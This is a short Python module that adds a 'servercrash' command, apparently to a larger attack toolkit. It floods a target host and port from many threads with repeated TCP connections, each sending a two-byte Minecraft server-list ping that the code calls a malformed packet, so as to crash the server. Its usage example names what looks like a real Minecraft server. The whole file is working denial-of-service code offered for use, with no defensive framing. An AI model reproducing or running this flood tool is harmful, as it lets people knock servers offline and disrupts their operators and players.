# New Command Update

import socket
import time
import threading
from colorama import Fore

def build_ping_packet():
    return b'\xFE\x01'

def attack(ip, port, duration, threads):
    end_time = time.time() + duration
    sent = 0
    lock = threading.Lock()

    def send_packets():
        nonlocal sent
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.send(build_ping_packet())
                s.close()
                with lock:
                    sent += 1
                    print(Fore.RED + f"[+] Packet sent ({sent})", end='\r')
            except:
                continue

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=send_packets)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print(Fore.LIGHTGREEN_EX + f"\n[✓] Attack finished. Total packets sent: {sent}")

def run(args):
    if len(args) < 4:
        print(Fore.LIGHTWHITE_EX + "Usage: servercrash <ip> <port> <duration> <threads>")
        print(Fore.LIGHTWHITE_EX + "Example: servercrash play.minearg.net 25565 10 30")
        return

    ip = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3])
    except ValueError:
        print(Fore.RED + "Port, duration and threads must be numbers.")
        return

    print(Fore.LIGHTRED_EX + f"[•] Sending malformed ping packets to {ip}:{port} for {duration} seconds using {threads} threads\n")
    attack(ip, port, duration, threads)
